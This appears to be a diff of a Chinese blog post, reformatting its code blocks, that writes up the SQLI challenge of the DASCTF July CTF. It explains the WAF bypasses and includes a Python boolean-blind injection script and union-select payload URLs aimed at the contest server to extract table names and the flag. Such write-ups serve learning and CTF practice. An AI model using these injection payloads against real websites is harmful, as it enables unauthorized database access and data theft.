@@ -63,7 +63,7 @@
     <script src="/js/util.js"></script>
     <script src="/js/main.js"></script>
 	
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
     
 		
 <!-- Layouts -->
@@ -157,28 +157,48 @@
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
                 <h1 id="DASCTF七月赛"><a href="#DASCTF七月赛" class="headerlink" title="DASCTF七月赛"></a>DASCTF七月赛</h1><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><p>这个sql注入又学到了很多姿势，把information_schema库都过滤了，原来还可以用<strong>sys.x$schema_flattened_keys</strong>来代替information_schema库。学到了，这里贴一下大佬发现的waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;;|benchmark|\^|if|</span><br><span class="line">[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|&#96;&#x2F;i&quot;, $id);</span><br></pre></td></tr></table></figure>
-
-<p>可以直接布尔盲注，空格被过滤用/**/绕过，Y1ng大佬用的是limit注入，还没学过，这里学一下</p>
+<pre><code>preg_match(&quot;/;|benchmark|\^|if|
+[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;, $id);</code></pre><p>可以直接布尔盲注，空格被过滤用/**/绕过，Y1ng大佬用的是limit注入，还没学过，这里学一下</p>
 <p>LIMIT[位置偏移量,]行数</p>
 <p>其中，中括号里面的参数是可选参数，位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。</p>
 <p>效果如下：</p>
 <img src="https://s1.ax1x.com/2020/07/26/aCDnds.png" style="zoom: 67%;" />
 
 <p>Y1ng大佬的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment">#库名 利用limit注入 sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名 flllaaaggg</span></span><br><span class="line">payload = <span class="string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE</span></span><br><span class="line"><span class="string">table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">		host = <span class="string">'''http://183.129.189.60:10004/?id=1'=(substr((&#123;payload&#125;),</span></span><br><span class="line"><span class="string">		&#123;i&#125;,1)='&#123;char&#125;')%23'''</span>.format(payload=payload.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">		r = req.get(host)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">r'admin666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			res += char</span><br><span class="line">			print(<span class="string">"found it: "</span>+res)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		t.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">as</span> req
+<span class="token keyword">import</span> time <span class="token keyword">as</span> t
+<span class="token keyword">import</span> base64 <span class="token keyword">as</span> b
+<span class="token keyword">import</span> string
+alpa <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
+res <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token comment" spellcheck="true">#库名 利用limit注入 sqlidb</span>
+<span class="token comment" spellcheck="true"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span>
 
+<span class="token comment" spellcheck="true">#表名 flllaaaggg</span>
+payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE
+table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> char <span class="token keyword">in</span> alpa<span class="token punctuation">:</span>
+        host <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://183.129.189.60:10004/?id=1'=(substr(({payload}),
+        {i},1)='{char}')%23'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token operator">=</span>i<span class="token punctuation">,</span> char<span class="token operator">=</span>char<span class="token punctuation">)</span>
+
+        r <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span>host<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token string">'admin666'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            res <span class="token operator">+=</span> char
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found it: "</span><span class="token operator">+</span>res<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        t<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></code></pre>
 <p>其中GROUP BY语句用于结合聚合函数，读取第一个表的名字。</p>
 <p>后面的依次截取表名的字母，读出表名。</p>
 <blockquote>
 <p>无列名注入，本来想无列名盲注，但是因为fllllaaaggg的表结构是id在前flag在后，无法根据flag来判断，<code>(select &#39;y1ng&#39;,&#39;y1ng&#39;)&gt;(select * from flllaaaggg)</code>这种思路的盲注失败(实际上也可以做，我当时发现可以直接利用回显来构造payload就没再试)。然后想到题目有回显，直接构造联合查询即可：</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10004&#x2F;?id&#x3D;100’&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*,1&#x2F;**&#x2F;from&#x2F;**&#x2F;flllaaaggg%23</span><br></pre></td></tr></table></figure>
-
-<p>也可以不盲注直接查</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10004&#x2F;?</span><br><span class="line">id&#x3D;100%27&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;FROM&#x2F;**&#x2F;&#x2F;**&#x2F;sys.x$schema_fl</span><br><span class="line">attened_keys&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;table_schema&#x3D;&#39;sqlidb&#39;&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;table_name&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1</span><br><span class="line">%23</span><br></pre></td></tr></table></figure>
-
-<p>学到很多</p>
+<pre><code>http://183.129.189.60:10004/?id=100’/**/union/**/select/**/*,1/**/from/**/flllaaaggg%23</code></pre><p>也可以不盲注直接查</p>
+<pre><code>http://183.129.189.60:10004/?
+id=100%27/**/union/**/SELECT/**/group_concat(table_name),2,3/**/FROM/**//**/sys.x$schema_fl
+attened_keys/**/WHERE/**/table_schema=&#39;sqlidb&#39;/**/GROUP/**/BY/**/table_name/**/limit/**/0,1
+%23</code></pre><p>学到很多</p>
 
             </div>
 
